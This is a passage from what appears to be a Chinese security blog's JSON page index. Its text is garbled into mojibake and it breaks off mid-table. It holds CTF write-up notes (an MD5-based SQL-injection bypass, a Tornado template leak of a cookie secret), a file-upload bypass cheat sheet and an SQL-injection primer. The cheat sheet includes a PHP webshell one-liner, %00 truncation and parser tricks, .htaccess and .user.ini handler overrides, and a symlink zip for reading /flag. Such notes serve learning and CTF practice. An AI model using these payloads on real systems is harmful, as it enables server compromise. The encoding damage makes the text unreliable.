[BJDCTF2020]Easy MD5ä¸€çœ¼ä¸çœŸffifdyop ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸² ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š'or'6&lt;ä¹±ç &gt; å³ 'or'66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b ç”¨é€”ï¼š select * from admin where password=''or'6&lt;ä¹±ç &gt;' å°±ç›¸å½“äºselect * from admin where password=''or 1 å®ç°sqlæ³¨å…¥ [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagç®€å•ï¼Œæ–°æ‰‹æ‘éš¾åº¦cookie + ä¼ å‚ +PHPç‰¹æ€§ [HCTF 2018]admin[æŠ¤ç½‘æ¯ 2018]easy_tornadoéšä¾¿ç‚¹äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†è¿™ä¸ªä¼ å‚ http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee æ ¹æ®hints.txtå‘ç°äº†md5(cookie_secret+md5(filename)) cookie_secretè¿™ç©æ„åˆ°åº•æ˜¯ä¸ªå•¥ï¼Œä¿ºä¸çŸ¥é“ï¼Œè‚¯å®šæ²¡æ³•ç ´è§£ ä¸è¿‡é˜´å·®é˜³é”™è®¿é—®åˆ°äº†è¿™ä¸ª http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=2 çœ‹æ ·å­æ˜¯pythonæ²™ç®±é€ƒé€¸äº†,ç®€å•fuzzä¸€ä¸‹ï¼Œé€å¿ƒå‡‰ï¼Œå¿ƒé£æ‰¬ æœç´¢ä¸€ä¸‹ï¼Œ http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg= {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6dcbf553-b18a-46ba-9487-8cf74e2c43ca'}","link":"/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/"},{"title":"æ–‡ä»¶ä¸Šä¼ å¤‡å¿˜å½•","text":"0x01 æ–‡ä»¶ä¸Šä¼ -å‰ç«¯æ‹¦æˆª | æ‡‚å¾—éƒ½æ‡‚ï¼Œå‰ç«¯æ‹¦æˆª=æ— æ•ˆæ“ä½œjsæ£€æŸ¥ä»£ç 12345678910111213141516171819//upload-labs level1function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; }} ä¼ ä¸ªæ­£å¸¸å›¾ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹å°±è¡Œäº†ã€‚ 0x02 æ–‡ä»¶ä¸Šä¼ -åç«¯æ ¡éªŒMINE | æ‡‚çš„éƒ½æ‡‚ï¼Œè¿˜æ˜¯æ— æ•ˆæ“ä½œåªæ ¡éªŒMIME1$_FILES['upload_file']['type'] == 'image/jpeg') æ— æ•ˆæ“ä½œï¼Œç›´æ¥ä¿®æ”¹å°±å®Œäº‹äº† å¸¸è§MIMETYPE audio/mpeg -&gt; .mp3 application/msword -&gt; .doc application/octet-stream -&gt; .exe application/pdf -&gt; .pdf application/x-javascript -&gt; .js application/x-rar -&gt; .rar application/zip -&gt; .zip image/gif -&gt; .gif image/jpeg -&gt; .jpg / .jpeg image/png -&gt; .png text/plain -&gt; .txt text/html -&gt; .html video/mp4 -&gt; .mp4 0x03 æ–‡ä»¶ä¸Šä¼ -æ‰©å±•åæ ¡éªŒ | ä½ è¿™wafä¿ç†Ÿå—ï¼Ÿå§¿åŠ¿1: é»‘åå•æ ¡éªŒï¼Œä½†é»‘åå•ä¸å…¨å…¶ä»–åç¼€:*.phpã€*.php3ã€*.php4ã€*.PHPã€*.phtmlã€*.pht å§¿åŠ¿2: ç™½åå•æ ¡éªŒï¼Œä½†æ˜¯æœ‰è§£ææ¼æ´æˆªæ–­ç»•è¿‡ /?upload=shell.php%00.jpg -&gt; /?upload=shell.php è§£ææ¼æ´ApacheæœåŠ¡å™¨ä»£ç ä¸­é™åˆ¶äº†æŸäº›åç¼€çš„æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶å®ƒåç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­å¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpå’Œphtmlæ–‡ä»¶ AddType application/x-httpd-php .php .phtml åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚å› æ­¤ï¼Œä¾‹å¦‚ä¸Šä¼ çš„æ–‡ä»¶åä¸º1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚ ä¾‹å¦‚ï¼šshell.php.qwe.asd -&gt;shell.php NginxNginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡ æ­£åˆ™åŒ¹é…è®¾ç½®SCRIPT_FILENAMEã€‚å½“è®¿é—®www.xxx.com/phpinfo.jpg/1.phpè¿™ä¸ª URLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg/1.phpâ€ï¼Œç„¶åæ„é€ æˆ SCRIPT_FILENAMEä¼ é€’ç»™PHP CGIã€‚ åŸå› æ˜¯å¼€å¯äº† fix_pathinfo è¿™ä¸ªé€‰é¡¹ï¼Œä¼šè§¦å‘ åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼š å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº†ã€‚ å½¢å¼ï¼š www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php å¦ä¸€ç§æ–¹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚ 0x04 æ–‡ä»¶ä¸Šä¼ -å†…å®¹æ£€æµ‹ | è¿™æ–‡ä»¶è¦æ˜¯æœ‰é•¿æœ‰çŸ­ï¼Œæˆ‘ç›´æ¥åƒäº†å®ƒ1.magic number | ä½ ä¸åŠˆå¼€è¿™æ–‡ä»¶å’‹çŸ¥é“å®ƒç†Ÿä¸ç†Ÿå•Š magic numberï¼Œå®ƒå¯ä»¥ç”¨æ¥æ ‡è®°æ–‡ä»¶æˆ–è€…åè®®çš„æ ¼å¼ï¼Œå¾ˆå¤šæ–‡ä»¶éƒ½æœ‰å¹»æ•°æ ‡å¿—æ¥è¡¨æ˜è¯¥æ–‡ä»¶çš„æ ¼å¼ã€‚ 1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 2.è¿‡æ»¤&lt;?ä»¥åŠphp @eval($_POST[cmd]); //éœ€è¦php.iniå¼€å¯çŸ­æ ‡ç­¾ 3.æ­£åˆ™æ›¿æ¢è€ç”Ÿå¸¸è°ˆï¼ŒåŒå†™ or å…¶ä»– 4.äºŒæ¬¡æ¸²æŸ“ | ä½ TMåŠˆæˆ‘æ–‡ä»¶æ˜¯å§å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡ã€‚ä½¿ç”¨winhexåœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¸ºå›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼å°±æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº« 0x05æ–‡ä»¶ä¸Šä¼ -é…ç½®æ–‡ä»¶ | çœ‹ï¼Œå¸é“çŸ³.htaccessåªæ˜¯é€‚ç”¨äºapacheï¼Œå¦‚æœå˜æˆniginxæˆ–è€…iisåˆ™ä¸ä¼šè¢«è§£ææ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹.htaccess .htaccessæ–‡ä»¶ï¼ˆâ€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å°†å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ å…·ä½“å®ç°ï¼š 1ã€ä¸Šä¼ .htaccessæ–‡ä»¶è‡³æœåŠ¡å™¨ä¸Šä¼ ç›®å½•ï¼Œæ­¤æ—¶apacheåœ¨è§£æè¯¥ç›®å½•ä¸‹çš„phpæ—¶å°†æŒ‰ç…§æ–‡ä»¶è¦æ±‚ã€‚åªè¦æ–‡ä»¶ååŒ¹é…åˆ°æ‰€å®šä¹‰çš„å­—ç¬¦ä¸²ï¼Œå°±ä¼šå°†è¯¥æ–‡ä»¶å½“ä½œphpè§£æã€‚ 123&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 2ã€ä¸Šä¼ .htaccessæ–‡ä»¶è®¾ç½®çš„å…³é”®å­—çš„æ–‡ä»¶åï¼Œå³ä¸Šä¼ ä¸€ä¸ªé»‘åå•æ²¡æœ‰è¿‡æ»¤çš„éšæ„åç¼€åæ–‡ä»¶ï¼Œä½†æ–‡ä»¶åä¸­ä¸€å®šè¦åŒ…å«shanaï¼Œå¦‚â€shana.jpgâ€ï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ã€‚æ­¤æ—¶â€shana.jpgâ€ä¼šè¢«Apacheå½“ä½œphpè§£æã€‚ .user.iniå¾ˆé€šç”¨ 1234//.user.iniGIF89aauto_prepend_file=xxx ä¼šè‡ªåŠ¨åŒ…å«xxx ç³»ç»Ÿç‰¹æ€§ä»…é€‚ç”¨windowså¹³å°windows ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ  æºç ä¸€å¼€å¤©åœ°ç­ï¼Œé€‰æ‹©è§†çª—ä¿å¹³å®‰ 0x06 æ–‡ä»¶ä¸Šä¼ -æ¡ä»¶ç«äº‰ | ä½ æ˜¯æ•…æ„æ¥æ‰¾çŒ¹ï¼Ÿæ–‡ä»¶èƒ½ä¼ ï¼Œä½†æ˜¯ä¼ è¿›å»åå°±ç»™ä½ åˆ äº†ï¼Œé€šå¸¸æƒ…å†µä¸‹éœ€è¦ä¸€è¾¹ä¼ ä¸€è¾¹è®¿é—®,æˆ–è€…åˆ©ç”¨ç¯å¢ƒï¼Œè®©phpè¿Ÿä¸€ç‚¹åˆ æ–‡ä»¶ 0x07 æ–‡ä»¶ä¸Šä¼ -è§£å‹æŠ¥é”™ | ä½ è¿™å‹ç¼©åŒ…æ˜¯é‡‘å­åšçš„è¿˜æ˜¯æ–‡ä»¶æ˜¯é‡‘å­åšçš„è¿™ç§æƒ…å†µè¦æ±‚æ¯”è¾ƒé«˜äº†ï¼Œéœ€è¦åç«¯è§£å‹å‹ç¼©åŒ…Dest0g3 520è¿æ–°èµ› ezipåŸç†:åˆ›å»ºä¸€ä¸ªè§£å‹åˆ°ä¸€åŠä¼šæŠ¥é”™çš„æ–‡ä»¶ï¼Œç„¶åé—ç•™shellæ–‡ä»¶getshell 0x08 æ–‡ä»¶ä¸Šä¼ -è½¯è¿æ¥ä¼ å¿«æ·æ–¹å¼è¿›å»ï¼Œç¦»è°± è¦æ±‚åç«¯ä¼šè§£å‹æ–‡ä»¶ ln -s /flag flag zip -y flag.zip flag NaN upload-exp è¿™é‡Œæ”¾ä¸€äº›å¸¸ç”¨çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¼šç»§ç»­æ›´æ–°1.å‰ç«¯æ–‡ä»¶ä¸Šä¼ 1234&lt;form id=&quot;upload-form&quot; action=&quot;ç›®æ ‡ç½‘ç«™&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;&lt;/form&gt; åç«¯æ¥æ”¶ä»£ç  123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }}?&gt; **æ³¨:**å‰ç«¯çš„&lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt;ä¸­name=upload_fileå¯¹åº”åç«¯ä»£ç çš„$_FILES['upload_file'],å‰ç«¯çš„&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;ä¸­name=&quot;submit&quot;å¯¹åº”åç«¯ä»£ç çš„isset($_POST['submit']),å®æˆ˜ç¯å¢ƒä¸­è¿˜æ˜¯éœ€è¦å¯¹å…·ä½“ç¯å¢ƒè¿›è¡Œä¸€äº›ä¿®æ”¹ 2. .htaccessæ–‡ä»¶1234567&lt;FilesMatch &quot;shana&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;æˆ–è€…AddType application/x-httpd-php .png 3. .user.iniæ–‡ä»¶1auto_prepend_file=xxx é²æ£’æ€§éå¸¸å¥½ï¼Œç”šè‡³å¯ä»¥ 12GIF89aauto_prepend_file=xxx è‡ªåŠ¨åŒ…å«xxx Refence:ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“ upload-labsé€šå…³æ”»ç•¥æ–‡ä»¶ä¸Šä¼ æ€»ç»“æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹.htaccess.user.iniå¯¼è‡´æ–‡ä»¶ä¸Šä¼ ç»•è¿‡","link":"/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"SQLæ³¨å…¥å­¦ä¹ å¯„å½•","text":"0x01 SQLSQL æ˜¯ä¸€ç§æ ‡å‡†SQL æ˜¯ä¸€é—¨ ANSIï¼ˆAmerican National Standards Institute ç¾å›½å›½å®¶æ ‡å‡†åŒ–ç»„ç»‡ï¼‰æ ‡å‡†çš„è®¡ç®—æœºè¯­è¨€ï¼Œä½†æ˜¯ä»ç„¶å­˜åœ¨ç€å¤šç§ä¸åŒç‰ˆæœ¬çš„ SQL è¯­è¨€ã€‚ åº“&amp;è¡¨ä¸€ä¸ªæ•°æ®åº“é€šå¸¸åŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨ã€‚æ¯ä¸ªè¡¨éƒ½æœ‰ä¸€ä¸ªåå­—æ ‡è¯†ï¼Œè¡¨åŒ…å«å¸¦æœ‰æ•°æ®çš„è®°å½•ã€‚ SQL åŸºç¡€è¯­æ³•æœ€ç®€å•çš„æŸ¥è¯¢SELECT * FROM è¡¨å è¿™ä¸ªè¯­å¥ä¼šæŠŠå½“å‰è¡¨ä¸‹æ‰€æœ‰çš„æ•°æ®å…¨éƒ½åˆ—å‡ºæ¥ï¼Œåœ¨æ•°æ®é‡æ¯”è¾ƒå°çš„æ—¶å€™ä¼šå¾ˆå¥½ç”¨ï¼Œä½†å½“æ•°æ®é‡ç‰¹åˆ«å¤§çš„æ—¶å€™å°±å®¹æ˜“è¢«ä¸€å †æ•°æ®æ·¹æ²¡ï¼Œä¸çŸ¥æ‰€æªã€‚ è¿™æ—¶å€™å¯ä»¥æ·»åŠ é™åˆ¶ï¼ŒæŒ‡å®šæˆ‘è¦å“ªä¸€åˆ—çš„æ•°æ® SELECT åˆ—å FROM è¡¨å æ•°æ®è¿˜æ˜¯å¾ˆå¤šï¼Œå¯ä»¥æ·»åŠ WHEREæ¥è¿›è¡Œè¿›ä¸€æ­¥é™åˆ¶ SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ å¦‚æœéœ€è¦å°†æ•°æ®æ’åºçš„è¯ï¼Œå¯ä»¥ç”¨ORDER BY SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å æœ‰æ—¶å€™ï¼Œå’±åªæƒ³è¿”å›å‰å‡ æ¡æ•°æ®ï¼Œå°±å¯ä»¥åŠ å…¥LIMIT SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å LIMIT æ•°å­— SQLæ“ä½œç¬¦WHERE åˆ—å LIKE é€šé…ç¬¦ æŒ‰ç…§é€šé…ç¬¦åŒ¹é… é€šé…ç¬¦ æè¿° % æ›¿ä»£0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ _ æ›¿ä»£1ä¸ªå­—ç¬¦ [charlist] å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ [^charlist] æˆ– [!charlist] ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ WHERE åˆ—å IN (â€˜å€¼1â€™,â€™å€¼2â€™) WHERE åˆ—å BETWEEN å€¼1 AND å€¼2; è”åˆæŸ¥è¯¢SELECT åˆ—å1,åˆ—å2â€¦ FROM table1 UNION SELECT åˆ—å1,åˆ—å2â€¦ FROM table2; æ³¨æ„:è”åˆæŸ¥è¯¢è¦æ±‚å‰åå­—æ®µæ•°ç›¸åŒï¼Œå¦åˆ™å°†ä¼šæŠ¥é”™. ç‰¹æ®Šçš„æ•°æ®åº“information_schemaæ‘˜è‡ªè¿™é‡Œ åœ¨æ•°æ®åº“é‡Œï¼Œæœ‰è¿™æ ·ä¸€ä¸ªæ•°æ®åº“information_schemaï¼Œæ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯å…ƒæ•°æ®å‘¢ï¼Ÿå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬â€œæ•°æ®è¯å…¸â€å’Œâ€œç³»ç»Ÿç›®å½•â€ã€‚ è¡¨å åŠŸèƒ½ SCHEMATA æä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯show databasesçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ TABLES æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯show tables from schemanameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ COLUMNS ä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯show columns from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ STATISTICS æä¾›äº†å…³äºè¡¨ç´¢å¼•çš„ä¿¡æ¯ã€‚æ˜¯show index from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ USER_PRIVILEGES ç»™å‡ºäº†å…³äºå…¨ç¨‹æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.useræˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ SCHEMA_PRIVILEGES ç»™å‡ºäº†å…³äºæ–¹æ¡ˆï¼ˆæ•°æ®åº“ï¼‰æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æ¥è‡ªmysql.dbæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ TABLE_PRIVILEGESï¼ˆè¡¨æƒé™ï¼‰ ç»™å‡ºäº†å…³äºè¡¨æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.tables_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ COLUMN_PRIVILEGESï¼ˆåˆ—æƒé™ï¼‰ ç»™å‡ºäº†å…³äºåˆ—æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.columns_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ CHARACTER_SETSï¼ˆå­—ç¬¦é›†ï¼‰ æä¾›äº†mysqlå®ä¾‹å¯ç”¨å­—ç¬¦é›†çš„ä¿¡æ¯ã€‚æ˜¯SHOW CHARACTER SETç»“æœé›†å–ä¹‹æ­¤è¡¨ã€‚ â€¦ â€¦ åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¯information_schema.tablesä¸‹é¢çš„table_nameä»¥åŠtable_schemaè¡¨ååŠå…¶æ‰€åœ¨çš„æ•°æ®åº“åå­—ã€‚ä½¿ç”¨information_schema.columnsä¸‹çš„column_nameè·å–åˆ—å select çš„å…¶ä»–ç”¨æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL æ³¨å…¥å¸¸ç”¨å‡½æ•°å­—ç¬¦æ‹¼æ¥1. concat()å‡½æ•° åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šconcat(str1, str2,â€¦) è¯´æ˜ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()å‡½æ•° åŠŸèƒ½ å’Œconcat()ä¸€æ ·ï¼Œä½†æ˜¯å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ è¯­æ³•ï¼šconcat_ws(separator, str1, str2, â€¦) ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ†éš”ç¬¦ä¸èƒ½ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œåˆ™è¿”å›ç»“æœä¸ºnullã€‚ 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()å‡½æ•° åŠŸèƒ½ï¼šå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ è¯­æ³•ï¼šgroup_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) ç›²æ³¨å¸¸ç”¨1.ascii()å‡½æ•°éƒ½ä¼šç”¨ï¼Œä¸è¯´äº† 2.substr()å‡½æ•° substr(str,pos,len);//str:å­—ç¬¦ä¸²ï¼Œposï¼šèµ·å§‹ä½ç½®ï¼Œlenï¼šæˆªæ–­é•¿åº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) 